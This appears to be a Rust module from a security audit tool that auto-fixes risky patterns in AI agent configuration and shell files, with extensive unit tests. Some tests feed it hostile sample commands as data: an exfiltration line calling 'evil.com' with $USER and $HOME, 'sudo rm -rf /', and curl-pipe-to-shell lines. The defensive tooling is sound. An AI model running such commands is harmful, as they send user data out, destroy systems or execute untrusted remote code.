use crate::error::{AuditError, Result};
use crate::rules::Finding;
use std::collections::HashMap;
use std::fs;
use std::path::Path;

/// Represents a potential fix for a finding
#[derive(Debug, Clone)]
pub struct Fix {
    pub finding_id: String,
    pub file_path: String,
    pub line: usize,
    pub description: String,
    pub original: String,
    pub replacement: String,
}

/// Result of applying fixes
#[derive(Debug)]
pub struct FixResult {
    pub applied: Vec<Fix>,
    pub skipped: Vec<(Fix, String)>, // Fix and reason for skipping
    pub errors: Vec<(Fix, String)>,  // Fix and error message
}

/// Auto-fix engine for security findings
pub struct AutoFixer {
    dry_run: bool,
}

impl AutoFixer {
    pub fn new(dry_run: bool) -> Self {
        Self { dry_run }
    }

    /// Generate fixes for the given findings
    pub fn generate_fixes(&self, findings: &[Finding]) -> Vec<Fix> {
        let mut fixes = Vec::new();

        for finding in findings {
            if let Some(fix) = self.generate_fix(finding) {
                fixes.push(fix);
            }
        }

        fixes
    }

    /// Generate a fix for a single finding
    fn generate_fix(&self, finding: &Finding) -> Option<Fix> {
        match finding.id.as_str() {
            // OP-001: Wildcard tool permission -> Restrict to specific tools
            "OP-001" => self.fix_wildcard_permission(finding),

            // PE-001: sudo usage -> Remove sudo
            "PE-001" => self.fix_sudo_usage(finding),

            // SC-001: Curl pipe bash -> Download and verify
            "SC-001" => self.fix_curl_pipe_bash(finding),

            // EX-001: Environment variable exfiltration -> Mask sensitive vars
            "EX-001" => self.fix_env_exfiltration(finding),

            // PI-001: Command injection via backticks -> Use safer alternative
            "PI-001" => self.fix_backtick_injection(finding),

            // DP-001: Hardcoded API key -> Use environment variable
            "DP-001" | "DP-002" | "DP-003" | "DP-004" | "DP-005" | "DP-006" => {
                self.fix_hardcoded_secret(finding)
            }

            // OP-009: Bash wildcard permission -> Restrict to specific commands
            "OP-009" => self.fix_bash_wildcard(finding),

            _ => None,
        }
    }

    fn fix_wildcard_permission(&self, finding: &Finding) -> Option<Fix> {
        // Replace allowed-tools: * with a safe default
        if finding.code.contains("allowed-tools: *")
            || finding.code.contains("allowed-tools: \"*\"")
        {
            let replacement = finding
                .code
                .replace("allowed-tools: *", "allowed-tools: Read, Grep, Glob")
                .replace("allowed-tools: \"*\"", "allowed-tools: Read, Grep, Glob");

            return Some(Fix {
                finding_id: finding.id.clone(),
                file_path: finding.location.file.clone(),
                line: finding.location.line,
                description: "Replace wildcard permission with safe defaults".to_string(),
                original: finding.code.clone(),
                replacement,
            });
        }

        // Handle allowedTools in JSON
        if finding.code.contains("\"allowedTools\"")
            && (finding.code.contains("\"*\"") || finding.code.contains(": \"*\""))
        {
            let replacement = finding
                .code
                .replace("\"*\"", "\"Read, Grep, Glob\"")
                .replace(": \"*\"", ": \"Read, Grep, Glob\"");

            return Some(Fix {
                finding_id: finding.id.clone(),
                file_path: finding.location.file.clone(),
                line: finding.location.line,
                description: "Replace wildcard permission with safe defaults".to_string(),
                original: finding.code.clone(),
                replacement,
            });
        }

        None
    }

    fn fix_sudo_usage(&self, finding: &Finding) -> Option<Fix> {
        // Remove sudo from the command
        if finding.code.contains("sudo ") {
            let replacement = finding.code.replace("sudo ", "");

            return Some(Fix {
                finding_id: finding.id.clone(),
                file_path: finding.location.file.clone(),
                line: finding.location.line,
                description: "Remove sudo privilege escalation".to_string(),
                original: finding.code.clone(),
                replacement,
            });
        }

        None
    }

    fn fix_curl_pipe_bash(&self, finding: &Finding) -> Option<Fix> {
        // Convert curl | bash to safer download-then-verify pattern
        if finding.code.contains("| bash") || finding.code.contains("| sh") {
            // Extract URL from curl command
            let code = &finding.code;
            let url_start = code.find("http");
            if let Some(start) = url_start {
                let url_end = code[start..]
                    .find(|c: char| c.is_whitespace() || c == '"' || c == '\'')
                    .map(|i| start + i)
                    .unwrap_or(code.len());
                let url = &code[start..url_end];

                let replacement = format!(
                    "# Download script first, verify before running\ncurl -o /tmp/install.sh {}\n# Review: cat /tmp/install.sh\n# Then run: sh /tmp/install.sh",
                    url
                );

                return Some(Fix {
                    finding_id: finding.id.clone(),
                    file_path: finding.location.file.clone(),
                    line: finding.location.line,
                    description: "Replace curl|bash with download-then-verify pattern".to_string(),
                    original: finding.code.clone(),
                    replacement,
                });
            }
        }

        None
    }

    fn fix_env_exfiltration(&self, finding: &Finding) -> Option<Fix> {
        // Mask sensitive environment variables
        if finding.code.contains("$HOME")
            || finding.code.contains("$USER")
            || finding.code.contains("$PATH")
        {
            let replacement = finding
                .code
                .replace("$HOME", "[REDACTED]")
                .replace("$USER", "[REDACTED]")
                .replace("$PATH", "[REDACTED]");

            return Some(Fix {
                finding_id: finding.id.clone(),
                file_path: finding.location.file.clone(),
                line: finding.location.line,
                description: "Mask sensitive environment variables".to_string(),
                original: finding.code.clone(),
                replacement,
            });
        }

        None
    }

    fn fix_backtick_injection(&self, finding: &Finding) -> Option<Fix> {
        // Replace backticks with safer $() syntax
        if finding.code.contains('`') {
            // Count backticks to ensure pairs
            let backtick_count = finding.code.matches('`').count();
            if backtick_count >= 2 && backtick_count.is_multiple_of(2) {
                let mut in_backtick = false;
                let mut result = String::new();

                for c in finding.code.chars() {
                    if c == '`' {
                        if in_backtick {
                            result.push(')');
                        } else {
                            result.push_str("$(");
                        }
                        in_backtick = !in_backtick;
                    } else {
                        result.push(c);
                    }
                }

                return Some(Fix {
                    finding_id: finding.id.clone(),
                    file_path: finding.location.file.clone(),
                    line: finding.location.line,
                    description: "Replace backticks with safer $() syntax".to_string(),
                    original: finding.code.clone(),
                    replacement: result,
                });
            }
        }

        None
    }

    fn fix_hardcoded_secret(&self, finding: &Finding) -> Option<Fix> {
        // Replace hardcoded secrets with environment variable references
        // This is a simple heuristic - in practice, more sophisticated detection is needed

        // Pattern: key = "value" or key: "value"
        let code = &finding.code;

        // Detect API key patterns
        if code.contains("api_key") || code.contains("apiKey") || code.contains("API_KEY") {
            // Simplified replacement - just add a comment to remind user to fix
            return Some(Fix {
                finding_id: finding.id.clone(),
                file_path: finding.location.file.clone(),
                line: finding.location.line,
                description: "Replace hardcoded secret with environment variable".to_string(),
                original: finding.code.clone(),
                replacement: format!(
                    "# TODO: Move secret to environment variable\n# {}",
                    finding.code
                ),
            });
        }

        None
    }

    fn fix_bash_wildcard(&self, finding: &Finding) -> Option<Fix> {
        // Replace Bash(*) with specific allowed commands
        if finding.code.contains("Bash(*)") || finding.code.contains("Bash( * )") {
            let replacement = finding
                .code
                .replace("Bash(*)", "Bash(ls:*, cat:*, echo:*)")
                .replace("Bash( * )", "Bash(ls:*, cat:*, echo:*)");

            return Some(Fix {
                finding_id: finding.id.clone(),
                file_path: finding.location.file.clone(),
                line: finding.location.line,
                description: "Replace Bash wildcard with specific allowed commands".to_string(),
                original: finding.code.clone(),
                replacement,
            });
        }

        None
    }

    /// Apply fixes to files
    pub fn apply_fixes(&self, fixes: &[Fix]) -> FixResult {
        let mut result = FixResult {
            applied: Vec::new(),
            skipped: Vec::new(),
            errors: Vec::new(),
        };

        // Group fixes by file
        let mut fixes_by_file: HashMap<String, Vec<&Fix>> = HashMap::new();
        for fix in fixes {
            fixes_by_file
                .entry(fix.file_path.clone())
                .or_default()
                .push(fix);
        }

        for (file_path, file_fixes) in fixes_by_file {
            match self.apply_fixes_to_file(&file_path, &file_fixes) {
                Ok(applied) => {
                    for fix in applied {
                        result.applied.push(fix.clone());
                    }
                }
                Err(e) => {
                    for fix in file_fixes {
                        result.errors.push((fix.clone(), e.to_string()));
                    }
                }
            }
        }

        result
    }

    fn apply_fixes_to_file(&self, file_path: &str, fixes: &[&Fix]) -> Result<Vec<Fix>> {
        let path = Path::new(file_path);

        // Read the file
        let content = fs::read_to_string(path).map_err(|e| AuditError::ReadError {
            path: file_path.to_string(),
            source: e,
        })?;

        let lines: Vec<&str> = content.lines().collect();
        let mut new_lines: Vec<String> = lines.iter().map(|s| s.to_string()).collect();
        let mut applied = Vec::new();

        // Sort fixes by line number in reverse order to avoid index shifting
        let mut sorted_fixes: Vec<&&Fix> = fixes.iter().collect();
        sorted_fixes.sort_by(|a, b| b.line.cmp(&a.line));

        for fix in sorted_fixes {
            if fix.line > 0 && fix.line <= new_lines.len() {
                let line_idx = fix.line - 1;
                let current_line = &new_lines[line_idx];

                // Check if the line still matches
                if current_line.contains(&fix.original)
                    || current_line.trim() == fix.original.trim()
                {
                    if !self.dry_run {
                        // Apply the fix
                        new_lines[line_idx] = current_line.replace(&fix.original, &fix.replacement);
                    }
                    applied.push((*fix).clone());
                }
            }
        }

        // Write back to file if not dry run
        if !self.dry_run && !applied.is_empty() {
            let new_content = new_lines.join("\n");
            fs::write(path, new_content).map_err(|e| AuditError::ReadError {
                path: file_path.to_string(),
                source: e,
            })?;
        }

        Ok(applied)
    }
}

impl Fix {
    /// Format fix for terminal display
    pub fn format_terminal(&self, dry_run: bool) -> String {
        use colored::Colorize;

        let mut output = String::new();

        let prefix = if dry_run { "[DRY RUN] " } else { "" };

        output.push_str(&format!(
            "{}{} {} at {}:{}\n",
            prefix.yellow(),
            "Fix:".cyan().bold(),
            self.description,
            self.file_path,
            self.line
        ));

        output.push_str(&format!("  {} {}\n", "-".red(), self.original.trim()));
        output.push_str(&format!("  {} {}\n", "+".green(), self.replacement.trim()));

        output
    }
}

impl FixResult {
    /// Format result for terminal display
    pub fn format_terminal(&self, dry_run: bool) -> String {
        use colored::Colorize;

        let mut output = String::new();

        if self.applied.is_empty() && self.skipped.is_empty() && self.errors.is_empty() {
            output.push_str(&"No fixable issues found.\n".yellow().to_string());
            return output;
        }

        let prefix = if dry_run { "[DRY RUN] " } else { "" };

        if !self.applied.is_empty() {
            output.push_str(&format!(
                "\n{}{}\n",
                prefix.yellow(),
                if dry_run {
                    "Would apply fixes:".cyan().bold()
                } else {
                    "Applied fixes:".green().bold()
                }
            ));

            for fix in &self.applied {
                output.push_str(&fix.format_terminal(dry_run));
                output.push('\n');
            }
        }

        if !self.skipped.is_empty() {
            output.push_str(&format!("\n{}\n", "Skipped:".yellow().bold()));
            for (fix, reason) in &self.skipped {
                output.push_str(&format!(
                    "  {} {} - {}\n",
                    "~".yellow(),
                    fix.description,
                    reason
                ));
            }
        }

        if !self.errors.is_empty() {
            output.push_str(&format!("\n{}\n", "Errors:".red().bold()));
            for (fix, error) in &self.errors {
                output.push_str(&format!(
                    "  {} {} - {}\n",
                    "!".red(),
                    fix.description,
                    error
                ));
            }
        }

        output.push_str(&format!(
            "\n{}: {} applied, {} skipped, {} errors\n",
            if dry_run { "Summary" } else { "Result" },
            self.applied.len(),
            self.skipped.len(),
            self.errors.len()
        ));

        output
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::rules::{Category, Confidence, Location, Severity};
    use tempfile::TempDir;

    fn create_test_finding(id: &str, code: &str, file: &str, line: usize) -> Finding {
        Finding {
            id: id.to_string(),
            severity: Severity::High,
            category: Category::Overpermission,
            confidence: Confidence::Firm,
            name: "Test Finding".to_string(),
            location: Location {
                file: file.to_string(),
                line,
                column: None,
            },
            code: code.to_string(),
            message: "Test message".to_string(),
            recommendation: "Test recommendation".to_string(),
            fix_hint: None,
            cwe_ids: vec![],
            rule_severity: None,
        }
    }

    #[test]
    fn test_fix_wildcard_permission() {
        let fixer = AutoFixer::new(true);
        let finding = create_test_finding("OP-001", "allowed-tools: *", "SKILL.md", 5);

        let fix = fixer.generate_fix(&finding);
        assert!(fix.is_some());

        let fix = fix.unwrap();
        assert!(fix.replacement.contains("Read, Grep, Glob"));
    }

    #[test]
    fn test_fix_sudo_usage() {
        let fixer = AutoFixer::new(true);
        let finding = create_test_finding("PE-001", "sudo apt install", "script.sh", 10);

        let fix = fixer.generate_fix(&finding);
        assert!(fix.is_some());

        let fix = fix.unwrap();
        assert!(!fix.replacement.contains("sudo"));
        assert!(fix.replacement.contains("apt install"));
    }

    #[test]
    fn test_fix_bash_wildcard() {
        let fixer = AutoFixer::new(true);
        let finding = create_test_finding("OP-009", "Bash(*)", "settings.json", 15);

        let fix = fixer.generate_fix(&finding);
        assert!(fix.is_some());

        let fix = fix.unwrap();
        assert!(fix.replacement.contains("ls:*"));
    }

    #[test]
    fn test_apply_fixes_dry_run() {
        let temp_dir = TempDir::new().unwrap();
        let test_file = temp_dir.path().join("test.md");
        fs::write(&test_file, "---\nallowed-tools: *\n---\n").unwrap();

        let fixer = AutoFixer::new(true); // dry run
        let finding = create_test_finding(
            "OP-001",
            "allowed-tools: *",
            &test_file.display().to_string(),
            2,
        );

        let fixes = fixer.generate_fixes(&[finding]);
        let result = fixer.apply_fixes(&fixes);

        assert_eq!(result.applied.len(), 1);

        // File should not be modified in dry run
        let content = fs::read_to_string(&test_file).unwrap();
        assert!(content.contains("allowed-tools: *"));
    }

    #[test]
    fn test_apply_fixes_real() {
        let temp_dir = TempDir::new().unwrap();
        let test_file = temp_dir.path().join("test.md");
        fs::write(&test_file, "---\nallowed-tools: *\n---\n").unwrap();

        let fixer = AutoFixer::new(false); // real run
        let finding = create_test_finding(
            "OP-001",
            "allowed-tools: *",
            &test_file.display().to_string(),
            2,
        );

        let fixes = fixer.generate_fixes(&[finding]);
        let result = fixer.apply_fixes(&fixes);

        assert_eq!(result.applied.len(), 1);

        // File should be modified
        let content = fs::read_to_string(&test_file).unwrap();
        assert!(content.contains("Read, Grep, Glob"));
        assert!(!content.contains("allowed-tools: *"));
    }

    #[test]
    fn test_no_fix_available() {
        let fixer = AutoFixer::new(true);
        let finding = create_test_finding("UNKNOWN-001", "some code", "file.md", 1);

        let fix = fixer.generate_fix(&finding);
        assert!(fix.is_none());
    }

    #[test]
    fn test_fix_format_terminal() {
        let fix = Fix {
            finding_id: "OP-001".to_string(),
            file_path: "SKILL.md".to_string(),
            line: 5,
            description: "Test fix".to_string(),
            original: "old code".to_string(),
            replacement: "new code".to_string(),
        };

        let output = fix.format_terminal(false);
        assert!(output.contains("Fix:"));
        assert!(output.contains("Test fix"));
        assert!(output.contains("old code"));
        assert!(output.contains("new code"));
    }

    #[test]
    fn test_fix_result_format_terminal() {
        let fix = Fix {
            finding_id: "OP-001".to_string(),
            file_path: "SKILL.md".to_string(),
            line: 5,
            description: "Test fix".to_string(),
            original: "old code".to_string(),
            replacement: "new code".to_string(),
        };

        let result = FixResult {
            applied: vec![fix],
            skipped: vec![],
            errors: vec![],
        };

        let output = result.format_terminal(true);
        assert!(output.contains("DRY RUN"));
        assert!(output.contains("1 applied"));
    }

    #[test]
    fn test_fix_curl_pipe_bash() {
        let fixer = AutoFixer::new(true);
        let finding = create_test_finding(
            "SC-001",
            "curl http://example.com/install.sh | bash",
            "run.sh",
            1,
        );

        let fix = fixer.generate_fix(&finding);
        assert!(fix.is_some());

        let fix = fix.unwrap();
        assert!(fix.replacement.contains("Download script first"));
        assert!(fix.replacement.contains("/tmp/install.sh"));
    }

    #[test]
    fn test_fix_curl_pipe_sh() {
        let fixer = AutoFixer::new(true);
        let finding =
            create_test_finding("SC-001", "curl https://get.sdkman.io | sh", "install.sh", 1);

        let fix = fixer.generate_fix(&finding);
        assert!(fix.is_some());

        let fix = fix.unwrap();
        assert!(fix.replacement.contains("Download script first"));
    }

    #[test]
    fn test_fix_env_exfiltration() {
        let fixer = AutoFixer::new(true);
        let finding = create_test_finding(
            "EX-001",
            "curl http://evil.com?user=$USER&home=$HOME",
            "exfil.sh",
            1,
        );

        let fix = fixer.generate_fix(&finding);
        assert!(fix.is_some());

        let fix = fix.unwrap();
        assert!(fix.replacement.contains("[REDACTED]"));
        assert!(!fix.replacement.contains("$USER"));
        assert!(!fix.replacement.contains("$HOME"));
    }

    #[test]
    fn test_fix_env_exfiltration_path() {
        let fixer = AutoFixer::new(true);
        let finding = create_test_finding("EX-001", "echo $PATH", "leak.sh", 1);

        let fix = fixer.generate_fix(&finding);
        assert!(fix.is_some());

        let fix = fix.unwrap();
        assert!(fix.replacement.contains("[REDACTED]"));
    }

    #[test]
    fn test_fix_backtick_injection() {
        let fixer = AutoFixer::new(true);
        let finding = create_test_finding("PI-001", "result=`cmd arg`", "script.sh", 1);

        let fix = fixer.generate_fix(&finding);
        assert!(fix.is_some());

        let fix = fix.unwrap();
        assert!(fix.replacement.contains("$(cmd arg)"));
        assert!(!fix.replacement.contains('`'));
    }

    #[test]
    fn test_fix_backtick_injection_multiple() {
        let fixer = AutoFixer::new(true);
        let finding = create_test_finding("PI-001", "echo `foo` and `bar`", "script.sh", 1);

        let fix = fixer.generate_fix(&finding);
        assert!(fix.is_some());

        let fix = fix.unwrap();
        assert!(fix.replacement.contains("$(foo)"));
        assert!(fix.replacement.contains("$(bar)"));
    }

    #[test]
    fn test_fix_backtick_injection_odd_count() {
        let fixer = AutoFixer::new(true);
        let finding = create_test_finding("PI-001", "echo ` only one backtick", "script.sh", 1);

        let fix = fixer.generate_fix(&finding);
        assert!(fix.is_none());
    }

    #[test]
    fn test_fix_hardcoded_secret() {
        let fixer = AutoFixer::new(true);
        let finding = create_test_finding("DP-001", "api_key = \"sk-1234567890\"", "config.py", 1);

        let fix = fixer.generate_fix(&finding);
        assert!(fix.is_some());

        let fix = fix.unwrap();
        assert!(fix.replacement.contains("TODO"));
        assert!(fix.replacement.contains("environment variable"));
    }

    #[test]
    fn test_fix_hardcoded_secret_api_key_variant() {
        let fixer = AutoFixer::new(true);
        let finding = create_test_finding("DP-002", "apiKey: 'secret123'", "config.yaml", 1);

        let fix = fixer.generate_fix(&finding);
        assert!(fix.is_some());
    }

    #[test]
    fn test_fix_hardcoded_secret_api_key_upper() {
        let fixer = AutoFixer::new(true);
        let finding = create_test_finding("DP-003", "const API_KEY = 'test'", "constants.js", 1);

        let fix = fixer.generate_fix(&finding);
        assert!(fix.is_some());
    }

    #[test]
    fn test_fix_wildcard_permission_json() {
        let fixer = AutoFixer::new(true);
        let finding = create_test_finding("OP-001", "\"allowedTools\": \"*\"", "settings.json", 5);

        let fix = fixer.generate_fix(&finding);
        assert!(fix.is_some());

        let fix = fix.unwrap();
        assert!(fix.replacement.contains("Read, Grep, Glob"));
    }

    #[test]
    fn test_fix_wildcard_permission_quoted() {
        let fixer = AutoFixer::new(true);
        let finding = create_test_finding("OP-001", "allowed-tools: \"*\"", "SKILL.md", 5);

        let fix = fixer.generate_fix(&finding);
        assert!(fix.is_some());

        let fix = fix.unwrap();
        assert!(fix.replacement.contains("Read, Grep, Glob"));
    }

    #[test]
    fn test_fix_bash_wildcard_with_spaces() {
        let fixer = AutoFixer::new(true);
        let finding = create_test_finding("OP-009", "Bash( * )", "settings.json", 15);

        let fix = fixer.generate_fix(&finding);
        assert!(fix.is_some());

        let fix = fix.unwrap();
        assert!(fix.replacement.contains("ls:*"));
    }

    #[test]
    fn test_generate_fixes_multiple() {
        let fixer = AutoFixer::new(true);
        let findings = vec![
            create_test_finding("OP-001", "allowed-tools: *", "SKILL.md", 5),
            create_test_finding("PE-001", "sudo rm -rf /", "script.sh", 10),
            create_test_finding("OP-009", "Bash(*)", "settings.json", 15),
        ];

        let fixes = fixer.generate_fixes(&findings);
        assert_eq!(fixes.len(), 3);
    }

    #[test]
    fn test_fix_result_format_terminal_no_fixes() {
        let result = FixResult {
            applied: vec![],
            skipped: vec![],
            errors: vec![],
        };

        let output = result.format_terminal(false);
        assert!(output.contains("No fixable issues found"));
    }

    #[test]
    fn test_fix_result_format_terminal_with_skipped() {
        let fix = Fix {
            finding_id: "OP-001".to_string(),
            file_path: "SKILL.md".to_string(),
            line: 5,
            description: "Test fix".to_string(),
            original: "old code".to_string(),
            replacement: "new code".to_string(),
        };

        let result = FixResult {
            applied: vec![],
            skipped: vec![(fix, "Code changed".to_string())],
            errors: vec![],
        };

        let output = result.format_terminal(false);
        assert!(output.contains("Skipped:"));
        assert!(output.contains("Code changed"));
    }

    #[test]
    fn test_fix_result_format_terminal_with_errors() {
        let fix = Fix {
            finding_id: "OP-001".to_string(),
            file_path: "SKILL.md".to_string(),
            line: 5,
            description: "Test fix".to_string(),
            original: "old code".to_string(),
            replacement: "new code".to_string(),
        };

        let result = FixResult {
            applied: vec![],
            skipped: vec![],
            errors: vec![(fix, "File not found".to_string())],
        };

        let output = result.format_terminal(false);
        assert!(output.contains("Errors:"));
        assert!(output.contains("File not found"));
    }

    #[test]
    fn test_fix_format_terminal_dry_run() {
        let fix = Fix {
            finding_id: "OP-001".to_string(),
            file_path: "SKILL.md".to_string(),
            line: 5,
            description: "Test fix".to_string(),
            original: "old code".to_string(),
            replacement: "new code".to_string(),
        };

        let output = fix.format_terminal(true);
        assert!(output.contains("DRY RUN"));
    }

    #[test]
    fn test_fix_result_format_terminal_applied_not_dry_run() {
        let fix = Fix {
            finding_id: "OP-001".to_string(),
            file_path: "SKILL.md".to_string(),
            line: 5,
            description: "Test fix".to_string(),
            original: "old code".to_string(),
            replacement: "new code".to_string(),
        };

        let result = FixResult {
            applied: vec![fix],
            skipped: vec![],
            errors: vec![],
        };

        let output = result.format_terminal(false);
        assert!(output.contains("Applied fixes:"));
        assert!(!output.contains("DRY RUN"));
    }

    #[test]
    fn test_apply_fixes_to_nonexistent_file() {
        let fixer = AutoFixer::new(false);
        let finding =
            create_test_finding("OP-001", "allowed-tools: *", "/nonexistent/path/file.md", 2);

        let fixes = fixer.generate_fixes(&[finding]);
        let result = fixer.apply_fixes(&fixes);

        assert!(result.applied.is_empty());
        assert!(!result.errors.is_empty());
    }

    #[test]
    fn test_apply_fixes_line_mismatch() {
        let temp_dir = TempDir::new().unwrap();
        let test_file = temp_dir.path().join("test.md");
        fs::write(&test_file, "---\nsomething-else: value\n---\n").unwrap();

        let fixer = AutoFixer::new(false);
        let finding = create_test_finding(
            "OP-001",
            "allowed-tools: *",
            &test_file.display().to_string(),
            2,
        );

        let fixes = fixer.generate_fixes(&[finding]);
        let result = fixer.apply_fixes(&fixes);

        assert!(result.applied.is_empty());
    }

    #[test]
    fn test_fix_debug_trait() {
        let fix = Fix {
            finding_id: "OP-001".to_string(),
            file_path: "SKILL.md".to_string(),
            line: 5,
            description: "Test fix".to_string(),
            original: "old".to_string(),
            replacement: "new".to_string(),
        };

        let debug_str = format!("{:?}", fix);
        assert!(debug_str.contains("Fix"));
        assert!(debug_str.contains("OP-001"));
    }

    #[test]
    fn test_fix_clone_trait() {
        let fix = Fix {
            finding_id: "OP-001".to_string(),
            file_path: "SKILL.md".to_string(),
            line: 5,
            description: "Test fix".to_string(),
            original: "old".to_string(),
            replacement: "new".to_string(),
        };

        let cloned = fix.clone();
        assert_eq!(fix.finding_id, cloned.finding_id);
        assert_eq!(fix.file_path, cloned.file_path);
    }

    #[test]
    fn test_fix_result_debug_trait() {
        let result = FixResult {
            applied: vec![],
            skipped: vec![],
            errors: vec![],
        };

        let debug_str = format!("{:?}", result);
        assert!(debug_str.contains("FixResult"));
    }

    #[test]
    fn test_fix_no_match_env_exfiltration() {
        let fixer = AutoFixer::new(true);
        let finding = create_test_finding("EX-001", "echo hello world", "script.sh", 1);

        let fix = fixer.generate_fix(&finding);
        assert!(fix.is_none());
    }

    #[test]
    fn test_fix_no_match_sudo() {
        let fixer = AutoFixer::new(true);
        let finding = create_test_finding("PE-001", "apt install vim", "script.sh", 1);

        let fix = fixer.generate_fix(&finding);
        assert!(fix.is_none());
    }

    #[test]
    fn test_fix_no_match_curl_pipe() {
        let fixer = AutoFixer::new(true);
        let finding = create_test_finding("SC-001", "curl http://example.com", "script.sh", 1);

        let fix = fixer.generate_fix(&finding);
        assert!(fix.is_none());
    }

    #[test]
    fn test_fix_no_match_wildcard() {
        let fixer = AutoFixer::new(true);
        let finding = create_test_finding("OP-001", "allowed-tools: Read, Write", "SKILL.md", 1);

        let fix = fixer.generate_fix(&finding);
        assert!(fix.is_none());
    }

    #[test]
    fn test_fix_no_match_bash_wildcard() {
        let fixer = AutoFixer::new(true);
        let finding = create_test_finding("OP-009", "Bash(ls:*, cat:*)", "settings.json", 1);

        let fix = fixer.generate_fix(&finding);
        assert!(fix.is_none());
    }

    #[test]
    fn test_fix_no_match_hardcoded_secret() {
        let fixer = AutoFixer::new(true);
        let finding = create_test_finding("DP-001", "password = 'secret'", "config.py", 1);

        let fix = fixer.generate_fix(&finding);
        assert!(fix.is_none());
    }

    #[test]
    fn test_apply_fixes_out_of_bounds_line() {
        let temp_dir = TempDir::new().unwrap();
        let test_file = temp_dir.path().join("test.md");
        fs::write(&test_file, "line1\nline2\n").unwrap();

        let fixer = AutoFixer::new(false);

        let fix = Fix {
            finding_id: "OP-001".to_string(),
            file_path: test_file.display().to_string(),
            line: 100,
            description: "Test fix".to_string(),
            original: "something".to_string(),
            replacement: "other".to_string(),
        };

        let result = fixer.apply_fixes(&[fix]);
        assert!(result.applied.is_empty());
    }

    #[test]
    fn test_apply_fixes_line_zero() {
        let temp_dir = TempDir::new().unwrap();
        let test_file = temp_dir.path().join("test.md");
        fs::write(&test_file, "line1\nline2\n").unwrap();

        let fixer = AutoFixer::new(false);

        let fix = Fix {
            finding_id: "OP-001".to_string(),
            file_path: test_file.display().to_string(),
            line: 0,
            description: "Test fix".to_string(),
            original: "something".to_string(),
            replacement: "other".to_string(),
        };

        let result = fixer.apply_fixes(&[fix]);
        assert!(result.applied.is_empty());
    }

    #[test]
    fn test_fix_dp_004_hardcoded_secret() {
        let fixer = AutoFixer::new(true);
        let finding = create_test_finding("DP-004", "api_key = 'test'", "config.py", 1);

        let fix = fixer.generate_fix(&finding);
        assert!(fix.is_some());
    }

    #[test]
    fn test_fix_dp_005_hardcoded_secret() {
        let fixer = AutoFixer::new(true);
        let finding = create_test_finding("DP-005", "apiKey = 'test'", "config.js", 1);

        let fix = fixer.generate_fix(&finding);
        assert!(fix.is_some());
    }

    #[test]
    fn test_fix_dp_006_hardcoded_secret() {
        let fixer = AutoFixer::new(true);
        let finding = create_test_finding("DP-006", "API_KEY = 'test'", "config.rb", 1);

        let fix = fixer.generate_fix(&finding);
        assert!(fix.is_some());
    }

    #[test]
    fn test_fix_wildcard_allowed_tools() {
        let fixer = AutoFixer::new(true);
        let code = r#"{"allowedTools": "*"}"#;
        let finding = create_test_finding("OP-001", code, "mcp.json", 1);

        let fix = fixer.generate_fix(&finding);
        assert!(fix.is_some());
        let fix = fix.unwrap();
        assert!(fix.replacement.contains("Read, Grep, Glob"));
    }

    #[test]
    fn test_fix_wildcard_allowed_tools_colon_format() {
        let fixer = AutoFixer::new(true);
        let code = r#"{"allowedTools": "*"}"#;
        let finding = create_test_finding("OP-001", code, "settings.json", 1);

        let fix = fixer.generate_fix(&finding);
        assert!(fix.is_some());
    }

    #[test]
    fn test_fix_curl_pipe_bash_with_download() {
        let fixer = AutoFixer::new(true);
        let code = "curl -sL https://example.com/script.sh | bash";
        let finding = create_test_finding("PE-001", code, "install.sh", 1);

        let fix = fixer.generate_fix(&finding);
        // This may or may not have a fix depending on pattern matching
        // The test exercises the code path
        let _ = fix;
    }
}
